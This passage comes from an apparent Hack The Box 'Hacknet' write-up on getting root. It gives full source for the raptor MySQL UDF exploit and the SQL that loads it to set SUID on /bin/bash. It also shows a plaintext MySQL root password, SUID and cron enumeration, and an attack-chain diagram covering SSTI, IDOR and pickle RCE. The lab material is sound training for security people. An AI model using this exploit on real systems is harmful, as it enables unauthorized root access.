drwxr-xr-x 3 root root 4096 Sep 14 12:30 ..
```

**Step 4: Create malicious UDF library**

On attacker machine, compile the exploit:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ cat > raptor_udf2.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
    unsigned int arg_count;
    enum Item_result *arg_type;
    char **args;
    unsigned long *lengths;
    char *maybe_null;
} UDF_ARGS;

typedef struct st_udf_init {
    char maybe_null;
    unsigned int decimals;
    unsigned long max_length;
    char *ptr;
    char const_item;
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count != 1)
        return 0;
    system(args->args[0]);
    return 0;
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    return 0;
}
EOF

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ gcc -Wall -I/usr/include/mysql -I. -shared raptor_udf2.c -o raptor_udf2.so

┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ # Transfer to target
┌──(sn0x㉿sn0x)-[~/HTB/Hacknet]
└─$ scp raptor_udf2.so sandy@hacknet.htb:/tmp/
```

**Step 5: Load UDF into MySQL**

```bash
sandy@hacknet:/tmp$ mysql -u root -p'h4ck3rs4re3veRywh3re99' << 'EOF'
USE mysql;
CREATE TABLE temp_table(data LONGBLOB);
INSERT INTO temp_table VALUES (LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT data FROM temp_table INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
DROP TABLE temp_table;
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
EOF
```

**Step 6: Execute as root**

```bash
sandy@hacknet:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash

sandy@hacknet:/tmp$ /bin/bash -p

bash-5.1# whoami
root

bash-5.1# id
uid=1001(sandy) gid=33(www-data) euid=0(root) groups=33(www-data)
```

#### Method 3: Exploiting Cron Jobs or SUID Binaries

**Step 1: Check for cron jobs**

```bash
sandy@hacknet:/var/www/HackNet$ cat /etc/crontab
# /etc/crontab: system-wide crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )

sandy@hacknet:/var/www/HackNet$ ls -la /etc/cron.*/
```

**Step 2: Check for world-writable scripts in cron paths**

```bash
sandy@hacknet:/var/www/HackNet$ find /etc/cron.* -type f -writable 2>/dev/null
# No results
```

**Step 3: Search for SUID binaries**

```bash
sandy@hacknet:/var/www/HackNet$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
```

All standard binaries, nothing exploitable here.

**Step 4: Check sudo privileges**

```bash
sandy@hacknet:/var/www/HackNet$ sudo -l
[sudo] password for sandy: 
# We don't have sandy's password, so this won't work
```

Since these alternate methods don't yield results on this specific box, the primary methods (password reuse or MySQL UDF) are the intended paths.

***

### Attack Chain

```
┌─────────────────┐
│  Web Login      │
│  (Register)     │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  SSTI Discovery │
│  (Username)     │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  IDOR on Likes  │
│  (/like/<id>)   │
└────────┬────────┘
         │
         v
┌─────────────────┐
│   Credential    │
│   Harvesting    │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  SSH as mikey   │
│  (Initial Shell)│
└────────┬────────┘
         │
         v
┌─────────────────┐
│  Cache Poisoning│
│  (Pickle RCE)   │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  Shell as sandy │
│  (www-data)     │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  GPG Key Exfil  │
│  + Cracking     │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  Decrypt Backups│
│  (MySQL Creds)  │
└────────┬────────┘
         │
         v
┌─────────────────┐
│  Password Reuse │
│  → ROOT ACCESS  │
└─────────────────┘
```

***

